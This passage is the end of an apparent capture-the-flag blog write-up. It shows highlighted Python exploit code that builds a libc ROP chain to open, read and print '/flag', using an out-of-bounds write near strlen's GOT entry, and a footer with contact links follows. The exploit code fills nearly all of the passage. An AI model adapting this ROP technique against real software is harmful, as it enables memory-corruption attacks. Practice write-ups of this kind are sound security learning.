style="color:#666666">=</span><span style="color:#DBD7CAEE"> libc_base </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">0000000000114b5c</span><br><span style="color:#DBD7CAEE">pop_rdi_ret </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> libc_base </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">000000000002a3e5</span><br><span style="color:#DBD7CAEE">pop_rsi_ret </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> libc_base </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">000000000002be51</span><br><span style="color:#DBD7CAEE">pop_rdx_ret </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> libc_base </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">00000000000796a2</span><br><span style="color:#DBD7CAEE">pop_rax_ret </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> libc_base </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">0000000000045eb0</span><br><span style="color:#DBD7CAEE">syscall </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> libc_base </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">0000000000091316</span><br><br><span style="color:#DBD7CAEE">offset </span><span style="color:#666666">=</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">start_addr </span><span style="color:#CB7676">-</span><span style="color:#DBD7CAEE"> strlen_got</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> //</span><span style="color:#4C9A91"> 8</span><br><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> flat</span><span style="color:#5eaab5">(</span><span style="color:#4d9375">[</span><span style="color:#DBD7CAEE">int1_ret</span><span style="color:#4d9375">]</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> flat</span><span style="color:#5eaab5">(</span><span style="color:#4d9375">[</span><span style="color:#DBD7CAEE">pop_rdi_ret</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> buf_addr </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">100</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pop_rsi_ret</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 4</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pop_rdx_ret</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pop_rax_ret</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 2</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> syscall</span><span style="color:#4d9375">]</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> flat</span><span style="color:#5eaab5">(</span><span style="color:#4d9375">[</span><span style="color:#DBD7CAEE">pop_rdi_ret</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 3</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pop_rsi_ret</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> buf_addr </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">300</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pop_rdx_ret</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">30</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pop_rax_ret</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> syscall</span><span style="color:#4d9375">]</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> flat</span><span style="color:#5eaab5">(</span><span style="color:#4d9375">[</span><span style="color:#DBD7CAEE">pop_rdi_ret</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pop_rsi_ret</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> buf_addr </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">300</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pop_rdx_ret</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">30</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pop_rax_ret</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> syscall</span><span style="color:#4d9375">]</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> payload</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ljust</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">100</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> asm</span><span style="color:#4d9375">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">ret</span><span style="color:#C98A7D77">"</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">/flag</span><span style="color:#C99076">\x00</span><span style="color:#C98A7D77">"</span><br><span style="color:#DBD7CAEE">write</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">payload</span><span style="color:#666666">,</span><span style="color:#CB7676"> -</span><span style="color:#DBD7CAEE">offset</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> add_rsp_ret</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">interactive</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br></code></pre></div></div></div></div><footer class="footer"><div class="footer-row footer-links"><span class="footer-label">保持联系</span><a href="mailto:xzy1476569428@163.com" class="footer-link"><p><a href="mailto:xzy1476569428@163.com" title="mailto:xzy1476569428@163.com">xzy1476569428@163.com</a></p></a><span aria-hidden="true" class="footer-separator">·</span><a href="/rss.xml" class="footer-link">RSS</a><span aria-hidden="true" class="footer-separator">·</span><a href="https://github.com/LittFlower/my_blog" class="footer-link"><p>GitHub</p></a></div><div class="footer-row footer-meta"><span><p>本站基于
<a href="https://github.com/unvariant/blog">unvariant/blog</a>
改造，除特别说明外内容以 CC BY 4.0 协议共享。</p></span></div></footer></body></html>